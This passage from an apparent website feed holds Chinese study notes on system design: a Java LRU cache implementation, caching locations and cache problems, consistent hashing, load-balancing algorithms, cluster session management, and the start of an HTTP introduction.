        <span>return</span> node<span>.</span>v<span>;</span>
    <span>}</span>


    <span>public</span> <span>void</span> <span>put</span><span>(</span><span>K</span> key<span>,</span> <span>V</span> value<span>)</span> <span>{</span>

        <span>if</span> <span>(</span>map<span>.</span><span>containsKey</span><span>(</span>key<span>)</span><span>)</span> <span>{</span>
            <span>Node</span> node <span>=</span> map<span>.</span><span>get</span><span>(</span>key<span>)</span><span>;</span>
            <span>unlink</span><span>(</span>node<span>)</span><span>;</span>
        <span>}</span>

        <span>Node</span> node <span>=</span> <span>new</span> <span>Node</span><span>(</span>key<span>,</span> value<span>)</span><span>;</span>
        map<span>.</span><span>put</span><span>(</span>key<span>,</span> node<span>)</span><span>;</span>
        <span>appendHead</span><span>(</span>node<span>)</span><span>;</span>

        <span>if</span> <span>(</span>map<span>.</span><span>size</span><span>(</span><span>)</span> <span>></span> maxSize<span>)</span> <span>{</span>
            <span>Node</span> toRemove <span>=</span> <span>removeTail</span><span>(</span><span>)</span><span>;</span>
            map<span>.</span><span>remove</span><span>(</span>toRemove<span>.</span>k<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>


    <span>private</span> <span>void</span> <span>unlink</span><span>(</span><span>Node</span> node<span>)</span> <span>{</span>

        <span>Node</span> pre <span>=</span> node<span>.</span>pre<span>;</span>
        <span>Node</span> next <span>=</span> node<span>.</span>next<span>;</span>

        pre<span>.</span>next <span>=</span> next<span>;</span>
        next<span>.</span>pre <span>=</span> pre<span>;</span>

        node<span>.</span>pre <span>=</span> <span>null</span><span>;</span>
        node<span>.</span>next <span>=</span> <span>null</span><span>;</span>
    <span>}</span>


    <span>private</span> <span>void</span> <span>appendHead</span><span>(</span><span>Node</span> node<span>)</span> <span>{</span>
        <span>Node</span> next <span>=</span> head<span>.</span>next<span>;</span>
        node<span>.</span>next <span>=</span> next<span>;</span>
        next<span>.</span>pre <span>=</span> node<span>;</span>
        node<span>.</span>pre <span>=</span> head<span>;</span>
        head<span>.</span>next <span>=</span> node<span>;</span>
    <span>}</span>


    <span>private</span> <span>Node</span> <span>removeTail</span><span>(</span><span>)</span> <span>{</span>

        <span>Node</span> node <span>=</span> tail<span>.</span>pre<span>;</span>

        <span>Node</span> pre <span>=</span> node<span>.</span>pre<span>;</span>
        tail<span>.</span>pre <span>=</span> pre<span>;</span>
        pre<span>.</span>next <span>=</span> tail<span>;</span>

        node<span>.</span>pre <span>=</span> <span>null</span><span>;</span>
        node<span>.</span>next <span>=</span> <span>null</span><span>;</span>

        <span>return</span> node<span>;</span>
    <span>}</span>


    <span>@Override</span>
    <span>public</span> <span>Iterator</span><span><span>&lt;</span><span>K</span><span>></span></span> <span>iterator</span><span>(</span><span>)</span> <span>{</span>

        <span>return</span> <span>new</span> <span>Iterator</span><span><span>&lt;</span><span>K</span><span>></span></span><span>(</span><span>)</span> <span>{</span>
            <span>private</span> <span>Node</span> cur <span>=</span> head<span>.</span>next<span>;</span>

            <span>@Override</span>
            <span>public</span> <span>boolean</span> <span>hasNext</span><span>(</span><span>)</span> <span>{</span>
                <span>return</span> cur <span>!=</span> tail<span>;</span>
            <span>}</span>

            <span>@Override</span>
            <span>public</span> <span>K</span> <span>next</span><span>(</span><span>)</span> <span>{</span>
                <span>Node</span> node <span>=</span> cur<span>;</span>
                cur <span>=</span> cur<span>.</span>next<span>;</span>
                <span>return</span> node<span>.</span>k<span>;</span>
            <span>}</span>
        <span>}</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br></div></div><h1 id="三、缓存位置" tabindex="-1"> 三、缓存位置</h1>
<h2 id="浏览器" tabindex="-1"> 浏览器</h2>
<p>当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。</p>
<h2 id="isp" tabindex="-1"> ISP</h2>
<p>网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。</p>
<h2 id="反向代理" tabindex="-1"> 反向代理</h2>
<p>反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。</p>
<h2 id="本地缓存" tabindex="-1"> 本地缓存</h2>
<p>使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。</p>
<h2 id="分布式缓存" tabindex="-1"> 分布式缓存</h2>
<p>使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。</p>
<p>相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。</p>
<h2 id="数据库缓存" tabindex="-1"> 数据库缓存</h2>
<p>MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。</p>
<h2 id="java-内部的缓存" tabindex="-1"> Java 内部的缓存</h2>
<p>Java 为了优化空间，提高字符串、基本数据类型包装类的创建效率，设计了字符串常量池及 Byte、Short、Character、Integer、Long、Boolean 这六种包装类缓冲池。</p>
<h2 id="cpu-多级缓存" tabindex="-1"> CPU 多级缓存</h2>
<p>CPU 为了解决运算速度与主存 IO 速度不匹配的问题，引入了多级缓存结构，同时使用 MESI 等缓存一致性协议来解决多核 CPU 缓存数据一致性的问题。</p>
<h1 id="四、cdn" tabindex="-1"> 四、CDN</h1>
<p>内容分发网络（Content distribution network，CDN）是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将 HTML、CSS、JavaScript、音乐、图片、视频等静态资源分发给用户。</p>
<p>CDN 主要有以下优点：</p>
<ul>
<li>更快地将数据分发给用户；</li>
<li>通过部署多台服务器，从而提高系统整体的带宽性能；</li>
<li>多台服务器可以看成是一种冗余机制，从而具有高可用性。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/15313ed8-a520-4799-a300-2b6b36be314f.jpg"/> </div><br>
<h1 id="五、缓存问题" tabindex="-1"> 五、缓存问题</h1>
<h2 id="缓存穿透" tabindex="-1"> 缓存穿透</h2>
<p>指的是对某个一定不存在的数据进行请求，该请求将会穿透缓存到达数据库。</p>
<p>解决方案：</p>
<ul>
<li>对这些不存在的数据缓存一个空数据；</li>
<li>对这类请求进行过滤。</li>
</ul>
<h2 id="缓存雪崩" tabindex="-1"> 缓存雪崩</h2>
<p>指的是由于数据没有被加载到缓存中，或者缓存数据在同一时间大面积失效（过期），又或者缓存服务器宕机，导致大量的请求都到达数据库。</p>
<p>在有缓存的系统中，系统非常依赖于缓存，缓存分担了很大一部分的数据请求。当发生缓存雪崩时，数据库无法处理这么大的请求，导致数据库崩溃。</p>
<p>解决方案：</p>
<ul>
<li>为了防止缓存在同一时间大面积过期导致的缓存雪崩，可以通过观察用户行为，合理设置缓存过期时间来实现；</li>
<li>为了防止缓存服务器宕机出现的缓存雪崩，可以使用分布式缓存，分布式缓存中每一个节点只缓存部分的数据，当某个节点宕机时可以保证其它节点的缓存仍然可用。</li>
<li>也可以进行缓存预热，避免在系统刚启动不久由于还未将大量数据进行缓存而导致缓存雪崩。</li>
</ul>
<h2 id="缓存一致性" tabindex="-1"> 缓存一致性</h2>
<p>缓存一致性要求数据更新的同时缓存数据也能够实时更新。</p>
<p>解决方案：</p>
<ul>
<li>在数据更新的同时立即去更新缓存；</li>
<li>在读缓存之前先判断缓存是否是最新的，如果不是最新的先进行更新。</li>
</ul>
<p>要保证缓存一致性需要付出很大的代价，缓存数据最好是那些对一致性要求不高的数据，允许缓存数据存在一些脏数据。</p>
<h2 id="缓存-无底洞-现象" tabindex="-1"> 缓存 “无底洞” 现象</h2>
<p>指的是为了满足业务要求添加了大量缓存节点，但是性能不但没有好转反而下降了的现象。</p>
<p>产生原因：缓存系统通常采用 hash 函数将 key 映射到对应的缓存节点，随着缓存节点数目的增加，键值分布到更多的节点上，导致客户端一次批量操作会涉及多次网络操作，这意味着批量操作的耗时会随着节点数目的增加而不断增大。此外，网络连接数变多，对节点的性能也有一定影响。</p>
<p>解决方案：</p>
<ul>
<li>优化批量数据操作命令；</li>
<li>减少网络通信次数；</li>
<li>降低接入成本，使用长连接 / 连接池，NIO 等。</li>
</ul>
<h1 id="六、数据分布" tabindex="-1"> 六、数据分布</h1>
<h2 id="哈希分布" tabindex="-1"> 哈希分布</h2>
<p>哈希分布就是将数据计算哈希值之后，按照哈希值分配到不同的节点上。例如有 N 个节点，数据的主键为 key，则将该数据分配的节点序号为：hash(key)%N。</p>
<p>传统的哈希分布算法存在一个问题：当节点数量变化时，也就是 N 值变化，那么几乎所有的数据都需要重新分布，将导致大量的数据迁移。</p>
<h2 id="顺序分布" tabindex="-1"> 顺序分布</h2>
<p>将数据划分为多个连续的部分，按数据的 ID 或者时间分布到不同节点上。例如 User 表的 ID 范围为 1 ~ 7000，使用顺序分布可以将其划分成多个子表，对应的主键范围为 1 ~ 1000，1001 ~ 2000，...，6001 ~ 7000。</p>
<p>顺序分布相比于哈希分布的主要优点如下：</p>
<ul>
<li>能保持数据原有的顺序；</li>
<li>并且能够准确控制每台服务器存储的数据量，从而使得存储空间的利用率最大。</li>
</ul>
<h1 id="七、一致性哈希" tabindex="-1"> 七、一致性哈希</h1>
<p>Distributed Hash Table（DHT） 是一种哈希分布方式，其目的是为了克服传统哈希分布在服务器节点数量变化时大量数据迁移的问题。</p>
<h2 id="基本原理" tabindex="-1"> 基本原理</h2>
<p>将哈希空间 [0, 2<sup>n</sup>-1] 看成一个哈希环，每个服务器节点都配置到哈希环上。每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中顺时针方向第一个大于等于该哈希值的节点上。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/68b110b9-76c6-4ee2-b541-4145e65adb3e.jpg"/> </div><br>
<p>一致性哈希在增加或者删除节点时只会影响到哈希环中相邻的节点，例如下图中新增节点 X，只需要将它前一个节点 C 上的数据重新进行分布即可，对于节点 A、B、D 都没有影响。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66402828-fb2b-418f-83f6-82153491bcfe.jpg"/> </div><br>
<h2 id="虚拟节点" tabindex="-1"> 虚拟节点</h2>
<p>上面描述的一致性哈希存在数据分布不均匀的问题，节点存储的数据量有可能会存在很大的不同。</p>
<p>数据不均匀主要是因为节点在哈希环上分布的不均匀，这种情况在节点数量很少的情况下尤其明显。</p>
<p>解决方式是通过增加虚拟节点，然后将虚拟节点映射到真实节点上。虚拟节点的数量比真实节点来得多，那么虚拟节点在哈希环上分布的均匀性就会比原来的真实节点好，从而使得数据分布也更加均匀。</p>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>大规模分布式存储系统</li>
<li><a href="https://tech.meituan.com/cache_about.html" target="_blank" rel="noopener noreferrer">缓存那些事</a></li>
<li><a href="https://my.oschina.net/jayhu/blog/732849" target="_blank" rel="noopener noreferrer">一致性哈希算法</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%85%A7%E5%AE%B9%E5%82%B3%E9%81%9E%E7%B6%B2%E8%B7%AF" target="_blank" rel="noopener noreferrer">内容分发网络</a></li>
<li><a href="https://www.aspirationhosting.com/aspiration-cdn/" target="_blank" rel="noopener noreferrer">How Aspiration CDN helps to improve your website loading speed?</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、负载均衡</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E9%9B%86%E7%BE%A4.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E9%9B%86%E7%BE%A4.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>

<h1 id="一、负载均衡" tabindex="-1"> 一、负载均衡</h1>
<p>集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。</p>
<p>负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。</p>
<p>负载均衡器可以用来实现高可用以及伸缩性：</p>
<ul>
<li>高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用；</li>
<li>伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。</li>
</ul>
<p>负载均衡器运行过程包含两个部分：</p>
<ol>
<li>根据负载均衡算法得到转发的节点；</li>
<li>进行转发。</li>
</ol>
<h2 id="负载均衡算法" tabindex="-1"> 负载均衡算法</h2>
<h3 id="_1-轮询-round-robin" tabindex="-1"> 1. 轮询（Round Robin）</h3>
<p>轮询算法把每个请求轮流发送到每个服务器上。</p>
<p>下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9daa3616-00a4-48c4-9146-792dc8499be3.jpg" width="500px"/> </div><br>
<p>该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bfea8772-d01b-4a51-8adc-edfd7d3dce84.jpg" width="500px"/> </div><br>
<h3 id="_2-加权轮询-weighted-round-robbin" tabindex="-1"> 2. 加权轮询（Weighted Round Robbin）</h3>
<p>加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。</p>
<p>例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4ab87717-e264-4232-825d-8aaf08f14e8b.jpg" width="500px"/> </div><br>
<h3 id="_3-最少连接-least-connections" tabindex="-1"> 3. 最少连接（least Connections）</h3>
<p>由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。</p>
<p>例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开，此时 (6, 4) 请求连接服务器 2。该系统继续运行时，服务器 2 会承担过大的负载。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e98deb5a-d5d4-4294-aa9b-9220d4483403.jpg" width="500px"/> </div><br>
<p>最少连接算法就是将请求发送给当前最少连接数的服务器上。</p>
<p>例如下图中，服务器 1 当前连接数最小，那么新到来的请求 6 就会被发送到服务器 1 上。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/43d323ac-9f07-4e4a-a315-4eaf8c38766c.jpg" width="500px"/> </div><br>
<h3 id="_4-加权最少连接-weighted-least-connection" tabindex="-1"> 4. 加权最少连接（Weighted Least Connection）</h3>
<p>在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。</p>
<h3 id="_5-随机算法-random" tabindex="-1"> 5. 随机算法（Random）</h3>
<p>把请求随机发送到服务器上。</p>
<p>和轮询算法类似，该算法比较适合服务器性能差不多的场景。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a42ad3a7-3574-4c48-a783-ed3d08a0688a.jpg" width="500px"/> </div><br>
<h3 id="_6-源地址哈希法-ip-hash" tabindex="-1"> 6. 源地址哈希法 (IP Hash)</h3>
<p>源地址哈希通过对客户端 IP 计算哈希值之后，再对服务器数量取模得到目标服务器的序号。</p>
<p>可以保证同一 IP 的客户端的请求会转发到同一台服务器上，用来实现会话粘滞（Sticky Session）</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0f399a9f-1351-4b2d-b8a4-2ebe82b1a703.jpg" width="500px"/> </div><br>
<h2 id="转发实现" tabindex="-1"> 转发实现</h2>
<h3 id="_1-http-重定向" tabindex="-1"> 1. HTTP 重定向</h3>
<p>HTTP 重定向负载均衡服务器使用某种负载均衡算法计算得到服务器的 IP 地址之后，将该地址写入 HTTP 重定向报文中，状态码为 302。客户端收到重定向报文之后，需要重新向服务器发起请求。</p>
<p>缺点：</p>
<ul>
<li>需要两次请求，因此访问延迟比较高；</li>
<li>HTTP 负载均衡器处理能力有限，会限制集群的规模。</li>
</ul>
<p>该负载均衡转发的缺点比较明显，实际场景中很少使用它。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/02a1fbfd-7a9d-4114-95df-ca2445587a1f.jpg" width="500px"/> </div><br>
<h3 id="_2-dns-域名解析" tabindex="-1"> 2. DNS 域名解析</h3>
<p>在 DNS 解析域名的同时使用负载均衡算法计算服务器 IP 地址。</p>
<p>优点：</p>
<ul>
<li>DNS 能够根据地理位置进行域名解析，返回离用户最近的服务器 IP 地址。</li>
</ul>
<p>缺点：</p>
<ul>
<li>由于 DNS 具有多级结构，每一级的域名记录都可能被缓存，当下线一台服务器需要修改 DNS 记录时，需要过很长一段时间才能生效。</li>
</ul>
<p>大型网站基本使用了 DNS 做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。也就是说，域名解析的结果为内部的负载均衡服务器 IP 地址。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d2c072cc-8b17-480c-813e-18cdb3b4b51f.jpg" width="500px"/> </div><br>
<h3 id="_3-反向代理服务器" tabindex="-1"> 3. 反向代理服务器</h3>
<p>反向代理服务器位于源服务器前面，用户的请求需要先经过反向代理服务器才能到达源服务器。反向代理可以用来进行缓存、日志记录等，同时也可以用来做为负载均衡服务器。</p>
<p>在这种负载均衡转发方式下，客户端不直接请求源服务器，因此源服务器不需要外部 IP 地址，而反向代理需要配置内部和外部两套 IP 地址。</p>
<p>优点：</p>
<ul>
<li>与其它功能集成在一起，部署简单。</li>
</ul>
<p>缺点：</p>
<ul>
<li>所有请求和响应都需要经过反向代理服务器，它可能会成为性能瓶颈。</li>
</ul>
<h3 id="_4-网络层" tabindex="-1"> 4. 网络层</h3>
<p>在操作系统内核进程获取网络数据包，根据负载均衡算法计算源服务器的 IP 地址，并修改请求数据包的目的 IP 地址，最后进行转发。</p>
<p>源服务器返回的响应也需要经过负载均衡服务器，通常是让负载均衡服务器同时作为集群的网关服务器来实现。</p>
<p>优点：</p>
<ul>
<li>在内核进程中进行处理，性能比较高。</li>
</ul>
<p>缺点：</p>
<ul>
<li>和反向代理一样，所有的请求和响应都经过负载均衡服务器，会成为性能瓶颈。</li>
</ul>
<h3 id="_5-链路层" tabindex="-1"> 5. 链路层</h3>
<p>在链路层根据负载均衡算法计算源服务器的 MAC 地址，并修改请求数据包的目的 MAC 地址，并进行转发。</p>
<p>通过配置源服务器的虚拟 IP 地址和负载均衡服务器的 IP 地址一致，从而不需要修改 IP 地址就可以进行转发。也正因为 IP 地址一样，所以源服务器的响应不需要转发回负载均衡服务器，可以直接转发给客户端，避免了负载均衡服务器的成为瓶颈。</p>
<p>这是一种三角传输模式，被称为直接路由。对于提供下载和视频服务的网站来说，直接路由避免了大量的网络传输数据经过负载均衡服务器。</p>
<p>这是目前大型网站使用最广负载均衡转发方式，在 Linux 平台可以使用的负载均衡服务器为 LVS（Linux Virtual Server）。</p>
<p>参考：</p>
<ul>
<li><a href="http://www.jscape.com/blog/load-balancing-algorithms" target="_blank" rel="noopener noreferrer">Comparing Load Balancing Algorithms</a></li>
<li><a href="http://slideplayer.com/slide/6599069/#" target="_blank" rel="noopener noreferrer">Redirection and Load Balancing</a></li>
</ul>
<h1 id="二、集群下的-session-管理" tabindex="-1"> 二、集群下的 Session 管理</h1>
<p>一个用户的 Session 信息如果存储在一个服务器上，那么当负载均衡器把用户的下一个请求转发到另一个服务器，由于服务器没有用户的 Session 信息，那么该用户就需要重新进行登录等操作。</p>
<h2 id="sticky-session" tabindex="-1"> Sticky Session</h2>
<p>需要配置负载均衡器，使得一个用户的所有请求都路由到同一个服务器，这样就可以把用户的 Session 存放在该服务器中。</p>
<p>缺点：</p>
<ul>
<li>当服务器宕机时，将丢失该服务器上的所有 Session。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1623f524-b011-40c8-b83f-eab38d538f76.png" width="400px"/> </div><br>
<h2 id="session-replication" tabindex="-1"> Session Replication</h2>
<p>在服务器之间进行 Session 同步操作，每个服务器都有所有用户的 Session 信息，因此用户可以向任何一个服务器进行请求。</p>
<p>缺点：</p>
<ul>
<li>占用过多内存；</li>
<li>同步过程占用网络带宽以及服务器处理器时间。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/40c6570d-c1d7-4c38-843e-ba991b2328c2.png" width="400px"/> </div><br>
<h2 id="session-server" tabindex="-1"> Session Server</h2>
<p>使用一个单独的服务器存储 Session 数据，可以使用传统的 MySQL，也使用 Redis 或者 Memcached 这种内存型数据库。</p>
<p>优点：</p>
<ul>
<li>为了使得大型网站具有伸缩性，集群中的应用服务器通常需要保持无状态，那么应用服务器不能存储用户的会话信息。Session Server 将用户的会话信息单独进行存储，从而保证了应用服务器的无状态。</li>
</ul>
<p>缺点：</p>
<ul>
<li>需要去实现存取 Session 的代码。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fdc45a09-f838-4348-8959-d2c793727788.png" width="600px"/> </div><br>
<p>参考：</p>
<ul>
<li><a href="https://sivalabs.in/2018/02/session-management-using-spring-session-jdbc-datastore/" target="_blank" rel="noopener noreferrer">Session Management using Spring Session with JDBC DataStore</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一 、HTTP 介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/HTTP.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/HTTP.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一-、http-介绍" tabindex="-1"> 一 、HTTP 介绍</h1>
<h2 id="http-简介" tabindex="-1"> HTTP 简介</h2>
<p>HTTP协议，即超文本传输协议(Hypertext transfer protocol)。是一种详细规定了浏览器和万维网(WWW = World Wide Web)服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。</p>
<p>HTTP协议作为TCP/IP模型中应用层的协议也不例外。HTTP协议通常承载于TCP协议之上，有时也承载于TLS或SSL协议层之上，这个时候，就成了我们常说的HTTPS。如下图：</p>
<p><img src="@source/assets/cs-note/network/HTTP简介.png" alt="" loading="lazy"></p>
<p>HTTP是一个应用层协议，由请求和响应构成，是一个标准的客户端服务器模型。HTTP是一个无状态的协议。</p>
<p>HTTP默认的端口号为80，HTTPS的端口号为443。</p>
<p>浏览网页是HTTP的主要应用，但是这并不代表HTTP就只能应用于网页的浏览。HTTP是一种协议，只要通信的双方都遵守这个协议，HTTP就能有用武之地。比如咱们常用的QQ，迅雷这些软件，都会使用HTTP协议(还包括其他的协议)。</p>
<h2 id="http-特点" tabindex="-1"> HTTP 特点</h2>
<ul>
<li>简单快速：客户向服务器请求服务时，只需传送请求方法和路径。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</li>
<li>灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</li>
<li>HTTP 0.9和1.0使用非持续连接：限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接。HTTP 1.1使用持续连接：不必为每个web对象创建一个新的连接，一个连接可以传送多个对象，采用这种方式可以节省传输时间。</li>
<li>无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li>
<li>支持B/S及C/S模式。</li>
</ul>
<h2 id="基本概念" tabindex="-1"> 基本概念</h2>
<h3 id="uri-urn-url" tabindex="-1"> URI,URN,URL</h3>
<p>URI 包含 URL 和 URN。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8441b2c4-dca7-4d6b-8efb-f22efccaf331.png" width="500px"> </div><br>
<p><strong>URI 是uniform resource identifier</strong>，统一资源标识符，用来唯一的标识一个资源。</p>
<p>URI一般由三部组成</p>
<ul>
<li>访问资源的命名机制</li>
<li>存放资源的主机名</li>
<li>资源自身的名称，由路径表示，着重强调于资源。</li>
</ul>
<p><strong>URL 是uniform resource locator</strong>，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</p>
<p>URL一般由三部组成</p>
<ul>
<li>协议(或称为服务方式)</li>
<li>存有该资源的主机IP地址(有时也包括端口号)</li>
<li>主机资源的具体地址。如目录和文件名等</li>
</ul>
<p><strong>URN 是uniform resource name</strong>，统一资源命名，是通过名字来标识资源，</p>
<p>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。</p>
<h1 id="二、http-工作流程" tabindex="-1"> 二、HTTP 工作流程</h1>
<h2 id="http-交互流程" tabindex="-1"> HTTP 交互流程</h2>
<p>一次HTTP操作称为一个事务，其工作过程可分为四步：</p>
<ol>
<li>首先客户机与服务器需要建立连接，HTTP的工作开始。</li>
